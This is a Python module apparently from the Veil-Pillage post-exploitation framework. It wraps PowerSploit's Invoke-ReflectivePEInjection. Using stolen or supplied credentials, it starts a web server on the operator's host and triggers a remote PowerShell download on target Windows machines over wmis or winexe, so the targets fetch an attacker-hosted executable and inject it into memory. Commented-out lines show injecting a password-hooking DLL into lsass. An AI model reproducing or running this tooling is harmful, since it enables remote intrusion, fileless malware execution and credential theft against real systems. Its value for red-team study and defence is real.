"""

Execute PowerSploit's CodeExecution/Invoke-ReflectivePEInjection.ps1 module on our host.

We do this by throwing up a temporary web server, hosting the script and using
invoking the downloader launcher on the host.

The target .dll/.exe is also hosted on said webserver.

All cred to the PowerSploit guys !
    https://github.com/mattifestation/PowerSploit/


Module built by @harmj0y

"""

import os, time

import settings
from lib import delivery_methods
from lib import command_methods
from lib import helpers

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Invoke-ReflectivePEInjection"
        self.description = ("Execute PowerSploit's Invoke-ReflectivePEInjection module on a host."
                            "This will invoke a variety of shellcode payloads on the host.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                    "use_ssl"           :   ["false", "use https for hosting"],
                                    "lhost"             :   ["", "lhost for hosting"],
                                    "exe_path"          :   ["", "local .exe or .dll to inject"],
                                    "exe_args"          :   ["none", "arguments for the .exe"]}


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        trigger_method = self.required_options["trigger_method"][0]
        exePath = self.required_options["exe_path"][0]
        use_ssl = self.required_options["use_ssl"][0]
        lhost = self.required_options["lhost"][0]
        exe_args = self.required_options["exe_args"][0]

        if exe_args == "none": exe_args = ""

        # sanity check that the exe path exists
        if not os.path.exists(exePath):
            print helpers.color(" [!] Error: exe to host '"+exePath+"' doesn't exist!", warning=True)
            return ""

        # path to the PowerSploit Invoke-Shellcode.ps1 powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/PowerSploit/Invoke-ReflectivePEInjection.ps1"
       
        exeBase = exePath.split("/")[-1]

        # command to invoke the loaded script
        scriptArguments = "Invoke-ReflectivePEInjection -PEUrl http://"+lhost+"/"+exeBase#+" -ExeArgs \""+exe_args+"\""
       
        if use_ssl.lower() == "true":
            # scriptArguments = "Invoke-ReflectivePEInjection -PEUrl https://"+lhost+"/HookPasswordReset.dll -procname lsass"
            scriptArguments = "Invoke-ReflectivePEInjection -PEUrl https://"+lhost+"/"+exeBase+" -ExeArgs \""+exe_args+"\""
        else:
            # scriptArguments = "Invoke-ReflectivePEInjection -PEUrl http://"+lhost+"/HookPasswordReset.dll -procname lsass"
            scriptArguments = "Invoke-ReflectivePEInjection -PEUrl http://"+lhost+"/"+exeBase+" -ExeArgs \""+exe_args+"\""

        extraFiles = [exePath]

        # trigger the powershell download on all targets
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, scriptArguments, trigger_method, ssl=use_ssl, extraFiles=extraFiles)

        for target in self.targets:
            self.output += "[*] Powersploit:Invoke-ReflectivePEInjection with -PEUrl -http://"+lhost+"/"+exeBase+" -ExeArgs \""+exe_args+"\" triggered using creds '"+username+":"+password+"' on "+target+" using "+trigger_method+"\n"
            
